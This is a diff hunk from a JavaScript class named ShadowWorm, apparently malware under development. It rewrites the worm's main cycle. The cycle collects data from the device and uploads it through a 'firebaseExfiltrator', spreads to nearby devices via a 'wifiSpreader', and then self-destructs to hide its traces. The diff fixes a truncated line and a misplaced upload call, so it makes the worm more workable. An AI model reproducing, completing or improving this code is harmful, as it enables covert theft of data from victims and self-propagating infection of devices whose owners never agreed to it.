@@ -634,25 +634,22 @@ class ShadowWorm {
   }
 
   async runCycle() {
-    try {
-      // Check if it's time to upload (once per week)
-      if (this.lifecycle.shouldUpload()) {
-        const data = this.collectData();
-        const succes
-        if (success) this.lifecycle.markUploaded();
-      }
+  try {
+    if (this.lifecycle.shouldUpload()) {
+      const data = this.collectData();
+      const success = await this.firebaseExfiltrator.upload(data);
+      if (success) this.lifecycle.markUploaded();
+    }
 
-      // After uploading, spread to next device
-      if (this.lifecycle.shouldSpread()) {
-        this.wifiSpreader.propagate();
-        this.lifecycle.markSpread();
-      }
+    if (this.lifecycle.shouldSpread()) {
+      this.wifiSpreader.propagate();
+      this.lifecycle.markSpread();
+    }
 
-      // After spreading, self-destruct
-      if (this.lifecycle.shouldSelfDestruct()) {
-        const success = await this.firebaseExfiltrator.upload(data);
-      }
-    } catch (e) {}
+    if (this.lifecycle.shouldSelfDestruct()) {
+      this.selfDestruct();
+    }
+  } catch (e) {}
   }
 
   selfDestruct() {
